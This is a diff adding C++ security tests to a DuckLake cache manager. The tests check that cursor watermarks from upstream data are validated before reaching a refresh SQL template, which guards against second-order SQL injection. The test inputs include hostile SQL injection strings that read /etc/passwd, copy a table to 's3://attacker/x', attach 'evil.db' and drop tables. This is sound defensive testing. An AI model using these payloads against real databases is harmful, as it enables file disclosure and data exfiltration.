@@ -930,3 +930,114 @@ TEST_CASE("a dropped and recreated cache table can still expire its snapshots",
         REQUIRE(after < before);
     }
 }
+
+TEST_CASE("a cursor watermark is validated against its declared type",
+          "[cache][ducklake][watermark][security]") {
+    // The watermark comes from cached DATA, which comes from upstream, and it
+    // is interpolated into the refresh template and EXECUTED on the DuckLake
+    // connection - which has ATTACH, COPY ... TO and read_csv of local files.
+    //
+    // Escaping it was tried and correctly removed (the documented
+    // double-brace form HTML-escapes what it renders, so a pre-escaped value
+    // arrives mangled) - but removing it left a second-order injection: one
+    // refresh ingests a hostile VARCHAR cursor value, it becomes max(cursor),
+    // and the NEXT refresh runs it. Validation does not fight the escaping
+    // problem: a value that passes needs none, and one that fails is dropped.
+    SECTION("timestamps and dates accept only what they are made of") {
+        REQUIRE(CacheManager::isPlausibleWatermark("2026-09-23 10:11:12.5", "timestamp"));
+        REQUIRE(CacheManager::isPlausibleWatermark("2026-09-23", "date"));
+        REQUIRE(CacheManager::isPlausibleWatermark("2026-09-23T10:11:12+02", "timestamptz"));
+        REQUIRE_FALSE(CacheManager::isPlausibleWatermark("2026-09-23'; DROP TABLE x --",
+                                                         "timestamp"));
+        REQUIRE_FALSE(CacheManager::isPlausibleWatermark("x' UNION SELECT 1 --", "date"));
+    }
+
+    SECTION("numeric cursors accept only numbers") {
+        REQUIRE(CacheManager::isPlausibleWatermark("123456", "int"));
+        REQUIRE(CacheManager::isPlausibleWatermark("-1.5e9", "double"));
+        REQUIRE_FALSE(CacheManager::isPlausibleWatermark("1; COPY (SELECT 1) TO 'x'", "bigint"));
+    }
+
+    SECTION("a string cursor rejects anything that can end a literal") {
+        // The documented `string` cursor type is the dangerous one, and the
+        // reason the type-blind version was unsafe.
+        REQUIRE(CacheManager::isPlausibleWatermark("page-token-abc123", "string"));
+        REQUIRE(CacheManager::isPlausibleWatermark("etag_9f8e7d", "varchar"));
+
+        for (const char* hostile : {
+                 "x' UNION SELECT * FROM read_csv('/etc/passwd') --",
+                 "x'); COPY (SELECT * FROM t) TO 's3://attacker/x'; --",
+                 "x\"; ATTACH 'evil.db'; --",
+                 "x-- comment",
+                 "x/* comment */",
+                 "x\nnewline",
+                 "x\\\\backslash",
+             }) {
+            INFO("value = " << hostile);
+            REQUIRE_FALSE(CacheManager::isPlausibleWatermark(hostile, "string"));
+        }
+    }
+
+    SECTION("an unknown cursor type gets the strict string rule") {
+        REQUIRE(CacheManager::isPlausibleWatermark("ordinary", "something-else"));
+        REQUIRE_FALSE(CacheManager::isPlausibleWatermark("x'--", "something-else"));
+    }
+
+    SECTION("an empty value is never a watermark") {
+        REQUIRE_FALSE(CacheManager::isPlausibleWatermark("", "timestamp"));
+        REQUIRE_FALSE(CacheManager::isPlausibleWatermark("", "string"));
+    }
+}
+
+TEST_CASE("a hostile cursor value never reaches the refresh template",
+          "[cache][ducklake][watermark][security]") {
+    // The predicate above is a pure function; this drives the PIPELINE, which
+    // is where the second-order injection lives: the value is read back out
+    // of the cache table that a previous refresh populated from upstream.
+    TwoTableCatalog cat("flapi_watermark_hostile");
+    CacheManager cache_manager(cat.adapter);
+
+    cat.sql("CREATE SCHEMA IF NOT EXISTS cache.s");
+    // A VARCHAR cursor - the documented `string` type - whose largest value
+    // is what an upstream row could have carried in.
+    cat.sql("CREATE TABLE cache.s.h AS SELECT * FROM (VALUES "
+            "(1, 'aaa'), "
+            "(2, 'zzz'' UNION SELECT * FROM read_csv(''/etc/passwd'') --')"
+            ") AS t(id, token)");
+
+    auto endpoint = cachedEndpoint("/h", "h");
+    endpoint.cache.cursor = CacheConfig::CursorConfig{};
+    endpoint.cache.cursor->column = "token";
+    endpoint.cache.cursor->type = "string";
+
+    std::map<std::string, std::string> params;
+    cache_manager.refreshDuckLakeCache(cat.config, endpoint, params);
+
+    SECTION("the watermark is dropped, not escaped and not passed through") {
+        const auto it = cat.adapter->captured_params.find("previousSnapshotTimestamp");
+        if (it != cat.adapter->captured_params.end()) {
+            INFO("watermark that reached the template: " << it->second);
+            REQUIRE(it->second.find('\'') == std::string::npos);
+            REQUIRE(it->second.find("UNION") == std::string::npos);
+            REQUIRE(it->second.find("read_csv") == std::string::npos);
+        }
+        // The full-load branch: absent is the expected outcome.
+        REQUIRE(it == cat.adapter->captured_params.end());
+    }
+
+    SECTION("an ordinary string cursor still yields a watermark") {
+        // Otherwise the section above would pass by rejecting everything.
+        cat.sql("CREATE TABLE cache.s.ok AS SELECT * FROM (VALUES "
+                "(1, 'aaa'), (2, 'zzz')) AS t(id, token)");
+        auto ok = cachedEndpoint("/ok", "ok");
+        ok.cache.cursor = CacheConfig::CursorConfig{};
+        ok.cache.cursor->column = "token";
+        ok.cache.cursor->type = "string";
+
+        std::map<std::string, std::string> ok_params;
+        cache_manager.refreshDuckLakeCache(cat.config, ok, ok_params);
+        const auto it = cat.adapter->captured_params.find("previousSnapshotTimestamp");
+        REQUIRE(it != cat.adapter->captured_params.end());
+        REQUIRE(it->second == "zzz");
+    }
+}
